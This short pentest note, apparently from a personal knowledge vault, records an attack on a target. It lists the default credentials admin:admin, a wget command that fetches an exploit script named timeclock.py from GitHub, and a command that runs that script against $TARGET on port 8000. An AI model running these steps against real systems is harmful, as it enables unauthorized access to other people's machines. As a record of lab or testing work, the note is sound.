---
category: Uncategorized
tags: [pentest]
created: 2024-12-21

---
Default creds admin:admin

```
wget https://raw.githubusercontent.com/timip/exploit/master/timeclock.py
```

```
python timeclock.py $TARGET 8000
```


Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
